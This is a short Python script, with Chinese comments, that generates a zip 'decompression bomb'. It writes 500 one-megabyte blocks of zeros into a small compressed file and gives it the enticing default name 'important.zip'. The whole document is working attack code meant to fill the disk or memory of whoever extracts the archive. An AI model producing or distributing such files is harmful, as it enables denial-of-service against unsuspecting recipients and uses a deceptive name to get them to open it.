import zipfile
import os

def create_zip_bomb(filename="important.zip", size_in_mb=500):
    """
    生成一个500MB的解压炸弹。
    """
    # 设定1MB的缓冲区
    chunk_size = 1024 * 1024 
    content = b'\0' * chunk_size
    
    with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        # 循环写入，每次写入1MB，循环500次
        for i in range(size_in_mb):
            # 将填充内容写入压缩包
            zipf.writestr(f"data_{i}.bin", content)
            
    print(f"成功生成 {filename}")
    print(f"解压后总大小: {size_in_mb} MB")
    print(f"压缩包实际大小: {os.path.getsize(filename) / 1024:.2f} KB")

if __name__ == "__main__":
    # 将参数改为 500
    create_zip_bomb(size_in_mb=500)
